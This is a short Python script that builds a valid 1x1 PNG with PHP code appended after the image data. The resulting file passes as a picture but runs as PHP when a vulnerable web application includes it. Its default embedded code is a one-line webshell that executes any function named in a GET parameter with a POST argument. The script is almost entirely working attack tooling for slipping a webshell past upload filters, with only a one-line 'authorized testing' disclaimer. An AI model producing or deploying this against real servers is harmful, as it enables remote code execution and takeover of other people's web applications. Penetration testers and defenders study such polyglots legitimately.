#!/usr/bin/env python3
"""
Generate a valid 1x1 PNG image with embedded PHP code at the end.
The resulting .png file acts as a normal image but can execute PHP when included.
For educational / authorized security testing only.
"""

import struct
import zlib
import random
import argparse

def create_png_with_php(php_code, output_file="payload.png"):
    """Create a minimal 1x1 PNG with PHP code appended after IEND."""

    # 1. Create a minimal 1x1 pixel grayscale image (raw pixel data)
    # 1 row, 1 pixel, gray+alpha (2 bytes), filter byte 0
    raw_data = b'\x00\xff\xff\xff\xff'  # filter=0, grey=255, alpha=255 (white opaque)
    # Randomize pixel color (RGBA)
    r, g, b, a = random.randint(0,255), random.randint(0,255), random.randint(0,255), 255
    raw_data = b'\x00' + bytes([r, g, b, a])

    # 2. Build IDAT chunk (compressed pixel data)
    idat_data = zlib.compress(raw_data)
    idat_crc = zlib.crc32(b'IDAT' + idat_data) & 0xFFFFFFFF
    idat_chunk = struct.pack('>I', len(idat_data)) + b'IDAT' + idat_data + struct.pack('>I', idat_crc)

    # 3. Build IHDR chunk (13 bytes)
    width, height = 1, 1
    bit_depth, color_type = 8, 6  # 6 = RGBA
    ihdr_data = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, 0, 0, 0)
    ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xFFFFFFFF
    ihdr_chunk = struct.pack('>I', len(ihdr_data)) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)

    # 4. Build IEND chunk
    iend_crc = zlib.crc32(b'IEND') & 0xFFFFFFFF
    iend_chunk = b'\x00\x00\x00\x00IEND' + struct.pack('>I', iend_crc)

    # 5. PNG Signature
    png_sig = b'\x89PNG\r\n\x1a\n'

    # 6. Assemble PNG (valid image) + PHP payload
    png_data = png_sig + ihdr_chunk + idat_chunk + iend_chunk

    # PHP code (ensure it starts with <?php and optionally ends with ?>)
    php_payload = b'\n' + php_code.encode()
    if not php_code.strip().startswith('<?'):
        php_payload = b'\n<?php ' + php_payload + b' ?>'

    payload = png_data + php_payload

    with open(output_file, 'wb') as f:
        f.write(payload)

    print(f"[+] Generated {output_file}")
    print(f"    PNG size: {len(png_data)} bytes")
    print(f"    PHP payload: {php_code.strip()}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Create a PNG with embedded PHP code.')
    parser.add_argument('-o', '--output', default='payload.png', help='Output PNG filename')
    parser.add_argument('-p', '--php', default='<?= $_GET[0]($_POST[1]) ?>',
                        help='PHP code to embed (default: simple webshell)')
    args = parser.parse_args()

    create_png_with_php(args.php, args.output)